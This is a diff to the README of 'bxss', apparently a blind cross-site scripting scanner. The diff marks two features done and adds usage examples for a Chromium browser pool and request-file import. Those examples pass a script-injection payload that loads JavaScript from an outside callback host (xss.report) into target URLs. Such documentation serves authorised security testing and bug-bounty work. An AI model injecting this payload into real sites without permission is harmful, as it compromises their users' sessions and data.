@@ -48,14 +48,13 @@ This will make `bxss` not only powerful but also highly accessible, regardless o
 ---
 
 ## ✅ TODOs
-- [ ] Chromium-based worker pool for DOM interaction and visual verification
+- [x] Chromium-based worker pool for DOM interaction and visual verification
 - [ ] Optional HTML/JSON reporting output
 - [ ] Add support for multi-platform payload customization (XSS Hunter, Interactsh, etc.)
 - [ ] Proxy support
-- [ ] Import custom requests
+- [x] Import custom requests
 
 ---
-
 
 ## 🧪 Experimental Features
 - Trace mode (experimental)
@@ -176,6 +175,20 @@ echo uber.com \
 -H "User-Agent" \ 
 -t \
 -rl 10
+```
+
+### Using Chromium Browser Pool
+```bash
+# Scan with a pool of 4 Chrome browsers for DOM-based detection
+cat urls.txt | bxss -p '><script src=https://xss.report/c/username></script>' \
+-browser chromium \
+-workers 4
+```
+
+### Using Custom Request File
+```bash
+# Process all requests in the file with the specified payload
+bxss -request requests.txt -p '><script src=https://xss.report/c/username></script>'
 ```
 
 For advanced dorking and vulnerability exploration, check out [Dorki](https://dorki.attaxa.com/) and sign up today!
